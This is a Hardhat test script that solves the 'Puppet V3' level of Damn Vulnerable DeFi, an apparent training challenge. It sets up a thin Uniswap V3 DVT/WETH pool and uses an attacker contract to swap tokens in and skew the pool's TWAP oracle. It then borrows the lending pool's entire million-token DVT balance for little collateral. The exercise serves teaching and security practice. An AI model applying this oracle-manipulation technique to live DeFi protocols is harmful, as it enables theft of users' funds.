const{expect} = require("chai");
const{expectRevert} = require("@openzeppelin/test-helpers");
const UniswapV3NonFungiblePositionManagerABI = require("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json").abi
const UniswapV3PoolABI = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json").abi
const UniswapV3FactoryABI = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json").abi
const IWETH = require("@uniswap/v2-periphery/build/WETH9.json").abi
const {time} = require("@nomicfoundation/hardhat-network-helpers");
const bn = require("bignumber.js");

bn.config({ EXPONENTIAL_AT: 999999, DECIMAL_PLACES: 40 });
function encodePriceSqrt(reserve0, reserve1) {
    return ethers.BigNumber.from(
        new bn(reserve1.toString())
            .div(reserve0.toString())
            .sqrt()
            .multipliedBy(new bn(2).pow(96))
            .integerValue(3)
            .toString()
    )
}

describe("PuppetV3 Damn Vulnerable DEFI", function(){


    let owner, account1, account2, hacker,
        DVT, dvt,
        WETH, nonFungiblePositionManager, pool, factory,
        PuppetV3Pool, puppetV3, PuppetAttack, puppetAttack

    let uniswapV3FactoryAddress = "0x1F98431c8aD98523631AE4a59f267346ea31F984";
    let uniswapV3NonFungiblePositionManagerAddress = "0xC36442b4a4522E871399CD717aBDD847Ab11FE88";
    let WETH_Address = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";


    before(async()=>{

        [owner, account1, account2, hacker] = await ethers.getSigners();


        //Deploy DVT Tokens
        DVT = await ethers.getContractFactory("DamnValuableToken");
        dvt = await DVT.deploy();
        await dvt.deployed();


        //Get WETH Contract and convert 10 eth to WETH
        WETH = await ethers.getContractAt(IWETH, WETH_Address, owner);
        await WETH.connect(owner).deposit({value: ethers.utils.parseEther("100")});


        //Get WETH Owner Balance
        let ownerWETHBalance = await WETH.balanceOf(owner.address);
        console.log(ownerWETHBalance/10**18);


        //Get DVT Token Owner Balance
        let ownerDVTBalance = await dvt.balanceOf(owner.address);
        console.log(ownerDVTBalance/10**18);

        //Get UniswapV3Factory Contract
        factory = await ethers.getContractAt(UniswapV3FactoryABI, uniswapV3FactoryAddress, owner);


        //Get NonFungiblePositionManager Contract
        nonFungiblePositionManager = await ethers.getContractAt(
            UniswapV3NonFungiblePositionManagerABI,
            uniswapV3NonFungiblePositionManagerAddress,
            owner
        );


        //Create Pool and Initialize it
        await nonFungiblePositionManager.createAndInitializePoolIfNecessary(
            dvt.address,
            WETH.address,
            3000,
            encodePriceSqrt(1,1)
        );


        //Get Pool Address
        let poolAddress = await factory.getPool(dvt.address, WETH.address, 3000);


        //get Pool contract
        pool = await ethers.getContractAt(UniswapV3PoolABI, poolAddress, owner);


        console.log("-----------Pool DVT/WETH on UniswapV3------------");
        console.log("");
        console.log("Pool on UniswapV3 Created at address:", poolAddress);
        console.log("");

        //Fill pool with WETH and DVT in same range 100 WETH, 100 DVT
        await dvt.approve(nonFungiblePositionManager.address, ethers.utils.parseEther("100"));
        await WETH.approve(nonFungiblePositionManager.address, ethers.utils.parseEther("100"));

        await nonFungiblePositionManager.mint({
            token0: dvt.address,
            token1: WETH.address,
            fee: 3000,
            tickLower: -60,
            tickUpper: 60,
            amount0Desired: ethers.utils.parseEther("100"),
            amount1Desired: ethers.utils.parseEther("100"),
            amount0Min: 0,
            amount1Min: 0,
            recipient: owner.address,
            deadline: (await ethers.provider.getBlock('latest')).timestamp * 2
        });

        nonFungiblePositionManager.on("IncreaseLiquidity", (tokenId, liquidity, amount0, amount1)=>{
            console.log("ERC721 TokenID From pool creation:", tokenId.toString());
            console.log("Liquidity:", liquidity.toString());
            console.log("DVT Amount in pool:", (amount0/10**18).toString(), "DVT");
            console.log("WETH Amount in pool:", (amount1/10**18).toString(), "WETH");
        });

        await new Promise(res => setTimeout(() => res(null), 5000));


        let poolResult = await pool.slot0();
        let sqrtPriceX96 = poolResult.sqrtPriceX96;
        let tick = poolResult.tick;
        let token0 = await pool.token0();
        let token1 = await pool.token1();

        console.log("");
        console.log("DVT/WETH SqrtPriceX96:", sqrtPriceX96.toString());
        console.log("DVT/WETH tick:", tick.toString());
        console.log("Token0 in Pair:", token0.toString(), "===> DVT");
        console.log("Token1 in Pair:", token1.toString(), "===> WETH");

        
        //If we want to check price for the pair
        // a = (sqrtPriceX96**2)/(2**192) = 1.0 ==> how many tokens0 to buy tokens1
        // b = 1/a = 1.0 ===> how many tokens1 to buy tokens0


        console.log("")
        console.log("--------Deploy PuppetV3 Pool---------");
        console.log("");


        //Deploy PuppetV3Pool
        PuppetV3Pool = await ethers.getContractFactory("PuppetV3Pool");
        puppetV3 = await PuppetV3Pool.deploy(WETH.address, dvt.address, pool.address);
        await puppetV3.deployed();


        //Fill puppet pool with 1 MLN of DVT Tokens
        await dvt.transfer(puppetV3.address, ethers.utils.parseEther("1000000"));

        let puppetV3PoolDVTBalance = await dvt.balanceOf(puppetV3.address);
        console.log("PuppetV3Pool DVT Balance:", (puppetV3PoolDVTBalance/10**18).toString(), "DVT");


        //Deploy PuppetAttack
        PuppetAttack = await ethers.getContractFactory("PuppetAttacker");
        puppetAttack = await PuppetAttack.connect(hacker).deploy(
            poolAddress,
            puppetV3.address,
            WETH.address,
            dvt.address,
        );
        await puppetAttack.deployed();

        //Send 100 tokens to the hacker
        await dvt.transfer(hacker.address, ethers.utils.parseEther("110"));


    });



    it("swap",async()=> {
        console.log("");
        console.log("-------- SWAP ---------");
        console.log("");

        await dvt.connect(hacker).transfer(puppetAttack.address, ethers.utils.parseEther("110"));

        //Check Balances Tokens in Pool
        let DVTBalancePool = await dvt.balanceOf(pool.address);
        console.log("DVT Balance in Pool Before Swap", (DVTBalancePool/10**18).toString(), "DVT");

        let WETHBalancePool = await WETH.balanceOf(pool.address);
        console.log("WETH Balance in Pool Before Swap", (WETHBalancePool/10**18).toString(), "WETH");
        console.log("");

        //Check Attacker Contract Tokens Balance
        let DVTBalanceAttacker = await dvt.balanceOf(puppetAttack.address);
        console.log("DVT Balance Attacker Before Swap", (DVTBalanceAttacker/10**18).toString(), "DVT");

        let WETHBalanceAttacker = await WETH.balanceOf(puppetAttack.address);
        console.log("WETH Balance Attacker Before Swap", (WETHBalanceAttacker/10**18).toString(), "WETH");
        console.log("");


        //SWAP 109 DVT Tokens for ETH in Pool
        await puppetAttack.connect(hacker).startSwap(ethers.utils.parseEther("109"));


        console.log("-------- After SWAP --------");
        console.log("");

        //Check Balances Tokens in Pool After Swap
        let DVTBalancePoolAfter = await dvt.balanceOf(pool.address);
        console.log("DVT Balance in Pool After Swap", (DVTBalancePoolAfter/10**18).toString(), "DVT");

        let WETHBalancePoolAfter = await WETH.balanceOf(pool.address);
        console.log("WETH Balance in Pool After Swap", (WETHBalancePoolAfter/10**18).toString(), "WETH");
        console.log("");


        //Check Attacker Contract Tokens Balance After Swap
        let DVTBalanceAttackerAfter = await dvt.balanceOf(puppetAttack.address);
        console.log("DVT Balance Attacker After Swap", (DVTBalanceAttackerAfter/10**18).toString(), "DVT");

        let WETHBalanceAttackerAfter = await WETH.balanceOf(puppetAttack.address);
        console.log("WETH Balance Attacker After Swap", (WETHBalanceAttackerAfter/10**18).toString(), "WETH");


        //Check Tick and sqrtPriceX96
        let poolResult = await pool.slot0();
        let sqrtPriceX96 = poolResult.sqrtPriceX96;
        let tick = poolResult.tick;

        console.log("DVT/WETH SqrtPriceX96:", sqrtPriceX96.toString());
        console.log("DVT/WETH tick:", tick.toString());
        console.log("");


        console.log("------ Amount request to borrow all the DVT from PuppetV3 Pool -------");
        console.log("");
        await time.increase(1000);


        //Check the amount of WETH to deposit, to borrow all the DVT in PuppetPool
        let amountToDeposit = await puppetAttack.checkAmountToDeposit();
        console.log("WETH to Deposit to borrow all the DVT in PuppetV3Pool", (amountToDeposit/10**18).toString(), "WETH");
        console.log("");
        //Hacker Withdraw Ether from Attacker Contract
        await puppetAttack.connect(hacker).withdrawWETH();

        //Check PuppetV3 DVT Balance
        let dvtBalanceInPuppetPoolV3 = await dvt.balanceOf(puppetV3.address);

        //Check Hacker DVT Balance
        let DVTBalanceHacker = await dvt.balanceOf(hacker.address);
        console.log("DVT Balance Hacker Before Borrow", (DVTBalanceHacker/10**18).toString(), "DVT");

        //Check Hacker WETH Balance
        let hackerWETHAmount = await WETH.balanceOf(hacker.address);
        console.log("Hacker WETH Amount", (hackerWETHAmount/10**18).toString(), "WETH");
        console.log("");


        console.log("------ Borrow From PuppetV3 Protocol ------");
        console.log("");

        //Approve WETH, and Borrow The entire amount of DVT
        await WETH.connect(hacker).approve(pool.address, ethers.utils.parseEther("99"));
        await puppetV3.connect(hacker).borrow(dvtBalanceInPuppetPoolV3);


        //Check Hacker DVT Balance After Borrow
        let DVTBalanceHackerAfter = await dvt.balanceOf(hacker.address);
        console.log("DVT Balance Hacker After Borrow", (DVTBalanceHackerAfter/10**18).toString(), "DVT");
        console.log("");

        //Check Hacker WETH Balance After Borrow
        let WETHBalanceHackerAfter = await WETH.balanceOf(hacker.address);
        console.log("WETH Balance Hacker After Borrow", (WETHBalanceHackerAfter/10**18).toString(), "WETH");
        console.log("");
    });
})